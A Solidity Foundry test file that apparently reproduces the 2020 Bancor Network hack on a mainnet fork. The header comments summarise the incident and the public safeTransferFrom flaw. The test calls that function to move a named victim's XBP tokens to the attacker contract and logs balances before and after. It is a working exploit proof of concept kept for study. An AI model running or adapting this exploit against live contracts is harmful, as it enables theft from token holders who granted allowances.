// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

// @KeyInfo
// Total Lost : ~545k USD
//   - Some of the loses are rescued by official team and white-hats.
//   - Precise loses TBD.
// Vulnerability Type : Access Control
// Attacked At : Mainnet, precise first attack's timestamp TBD.
// Attacker : TBD
// Exploit Contract : N/A
// Revenue Address : TBD
// Victim Contract : N/A
//   - Victims are those addresses who approved any ERC20 tokens to the vulnerable contracts.
// Vulnerable Snippet : 
//   - https://etherscan.io/address/0x8dfeb86c7c962577ded19ab2050ac78654fea9f7#code#L537
//   - https://etherscan.io/address/0x5f58058C0eC971492166763c8C22632B583F667f#code#L537
//   - https://etherscan.io/address/0x923cab01e6a4639664aa64b76396eec0ea7d3a5f#code#L537
// Attack Txs : TBD
// 
// @Info
// Some of the newly deployed Bancor contracts had the 'safeTransferFrom' function public.
// As a result, if any user had granted approval to these contracts was vulnerable.
// The attacker can check if an user had granted an allowance to Bancor Contracts to transfer the ERC20 token 
//
// @Ref
// Bancor Network : https://blog.bancor.network/bancors-response-to-today-s-smart-contract-vulnerability-dc888c589fe4
// 1inch Network : https://medium.com/1inch-network/bancor-network-hack-2020-3c71444fd59d

contract Attacker is Test {
    /*
     * @dev This PoC reproduces one of the attack transactions : 0x4643b63dcbfc385b8ab8c86cbc46da18c2e43d277de3e5bc3b4516d3c0fdeb9f
     */
    
    IBancorNetwork private constant BancorNetwork = IBancorNetwork(0x5f58058C0eC971492166763c8C22632B583F667f);
    IXBPToken private constant XBP = IXBPToken(0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40);
    address private constant victim = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;

    function setUp() public {
        vm.createSelectFork("mainnet", 10_307_563);
    }

    function testExploit() public {
        console.log("[Allowance Check] XBP.allowance(victim, BancorNetwork) = %18e", XBP.allowance(victim, address(BancorNetwork)));

        console.log("[Before Attack] XBP.balanceOf(victim) = %18e", XBP.balanceOf(victim));
        console.log("[Before Attack] XBP.balanceOf(attacker) = %18e", XBP.balanceOf(address(this)));

        BancorNetwork.safeTransferFrom(address(XBP), victim, address(this), XBP.balanceOf(victim));

        console.log("[After Attack] XBP.balanceOf(victim) = %18e", XBP.balanceOf(victim));
        console.log("[After Attack] XBP.balanceOf(attacker) = %18e", XBP.balanceOf(address(this)));
    }
}

// ------------------------------------------------------------------
//                              INTERFACES
// ------------------------------------------------------------------
// Shortened interface, removed unused methods.

interface IBancorNetwork {
    function safeTransferFrom(address _token, address _from, address _to, uint256 _value) external;
}

interface IXBPToken {
    function allowance(address, address) external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}